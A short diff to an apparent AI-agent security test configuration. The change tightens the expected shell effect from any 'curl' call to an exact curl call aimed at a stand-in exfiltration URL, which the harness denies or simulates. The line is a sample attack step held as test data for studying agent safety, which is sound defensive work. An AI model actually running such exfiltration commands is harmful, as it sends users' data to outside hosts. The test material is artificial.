@@ -16,8 +16,8 @@ success_oracle:
   - type: expected_effects
     effects:
       - type: shell.exec
-        argv: ["curl"]
-        match: prefix
+        argv: ["curl", "https://example.invalid/exfiltrate"]
+        match: exact
         outcomes: [denied, simulated]
   - type: process_exited
 safety_oracle:
